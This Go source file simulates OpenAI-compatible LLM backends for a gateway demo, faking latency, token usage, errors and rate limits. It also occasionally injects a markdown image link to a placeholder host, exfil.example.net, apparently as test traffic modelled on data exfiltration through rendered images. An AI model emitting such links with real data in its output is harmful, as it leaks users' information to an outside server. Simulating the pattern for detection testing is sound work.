// Package fakellm simulates OpenAI-compatible chat completions per backend:
// latency, token usage, errors and the occasional exfil URL, with no real
// provider behind it. The HTTP server in cmd/fake-openai and the in-process
// backfill share this so both produce the same shapes.
package fakellm

import (
	"math/rand/v2"
	"strings"
	"time"
)

type Message struct {
	Role    string `json:"role"`
	Content string `json:"content"`
}

type ChatRequest struct {
	Model         string    `json:"model"`
	Messages      []Message `json:"messages"`
	Stream        bool      `json:"stream,omitempty"`
	MaxTokens     int       `json:"max_tokens,omitempty"`
	StreamOptions *struct {
		IncludeUsage bool `json:"include_usage"`
	} `json:"stream_options,omitempty"`
}

type Usage struct {
	PromptTokens        int `json:"prompt_tokens"`
	CompletionTokens    int `json:"completion_tokens"`
	TotalTokens         int `json:"total_tokens"`
	PromptTokensDetails struct {
		CachedTokens int `json:"cached_tokens"`
	} `json:"prompt_tokens_details"`
	CompletionTokensDetails struct {
		ReasoningTokens int `json:"reasoning_tokens"`
	} `json:"completion_tokens_details"`
}

// Profile is how one fake backend behaves.
type Profile struct {
	P50       time.Duration
	ErrorRate float64 // share of requests that fail with ErrorCode
	ErrorCode int
}

// Profiles mirror the demo backends' health (demo.Backends): anthropic-prod is
// degraded with overload errors that trigger fallback, azure-openai-eu is down.
var Profiles = map[string]Profile{
	"openai-prod":     {P50: 412 * time.Millisecond, ErrorRate: 0.002, ErrorCode: 500},
	"anthropic-prod":  {P50: 980 * time.Millisecond, ErrorRate: 0.08, ErrorCode: 529},
	"bedrock-eu":      {P50: 640 * time.Millisecond, ErrorRate: 0.004, ErrorCode: 503},
	"vllm-internal":   {P50: 220 * time.Millisecond, ErrorRate: 0.001, ErrorCode: 503},
	"azure-openai-eu": {P50: 300 * time.Millisecond, ErrorRate: 1, ErrorCode: 503},
}

const rateLimitRate = 0.012

// Plan is a fully decided response: callers either sleep through it (HTTP) or
// just read the numbers (backfill).
type Plan struct {
	Status   int
	Error    string
	TTFT     time.Duration
	Duration time.Duration
	Chunks   []string
	Usage    Usage
}

func (p Plan) Content() string { return strings.Join(p.Chunks, "") }

// EstimateTokens is the fake tokenizer: about four characters per token.
func EstimateTokens(s string) int { return (len(s) + 3) / 4 }

var words = strings.Fields(`the gateway routes each request through identity budget and policy checks
before choosing a backend and the receipt records every decision so teams can see what happened
summaries follow with key points owners and next steps for the reviewed thread`)

func Simulate(backend string, req ChatRequest, r *rand.Rand) Plan {
	prof, ok := Profiles[backend]
	if !ok {
		prof = Profile{P50: 500 * time.Millisecond, ErrorRate: 0.01, ErrorCode: 500}
	}
	if r.Float64() < prof.ErrorRate {
		msg := "upstream error"
		if prof.ErrorCode == 529 {
			msg = "overloaded"
		}
		return Plan{Status: prof.ErrorCode, Error: msg, Duration: time.Duration(float64(prof.P50) * (0.1 + r.Float64()*0.3))}
	}
	if r.Float64() < rateLimitRate {
		return Plan{Status: 429, Error: "rate limited", Duration: 20 * time.Millisecond}
	}

	prompt := 0
	for _, m := range req.Messages {
		prompt += EstimateTokens(m.Content) + 4
	}
	maxOut := req.MaxTokens
	if maxOut <= 0 {
		maxOut = 900
	}
	maxOut = max(maxOut, 41)
	out := 40 + int(r.Float64()*float64(maxOut-40))
	var u Usage
	u.PromptTokens = prompt
	u.CompletionTokens = out
	if r.Float64() < 0.4 {
		u.PromptTokensDetails.CachedTokens = int(float64(prompt) * r.Float64() * 0.7)
	}
	if strings.HasPrefix(req.Model, "gpt-5") && r.Float64() < 0.5 {
		u.CompletionTokensDetails.ReasoningTokens = int(r.Float64() * 3000)
	}
	u.TotalTokens = u.PromptTokens + u.CompletionTokens + u.CompletionTokensDetails.ReasoningTokens

	// Content is roughly out tokens long, emitted in ~8-token chunks.
	var chunks []string
	var b strings.Builder
	exfilAt := -1
	if r.Float64() < 0.007 {
		exfilAt = int(r.Float64() * float64(out))
	}
	for i := 0; i < out; i++ {
		if i == exfilAt {
			b.WriteString(" ![status](https://exfil.example.net/c?d=" + words[r.IntN(len(words))] + ")")
		} else {
			b.WriteString(" " + words[r.IntN(len(words))])
		}
		if (i+1)%8 == 0 || i == out-1 {
			chunks = append(chunks, b.String())
			b.Reset()
		}
	}
	dur := time.Duration(float64(prof.P50)*(0.5+r.Float64()*1.8)) + time.Duration(out)*600*time.Microsecond
	return Plan{
		Status:   200,
		TTFT:     time.Duration(120+r.IntN(400)) * time.Millisecond,
		Duration: dur,
		Chunks:   chunks,
		Usage:    u,
	}
}
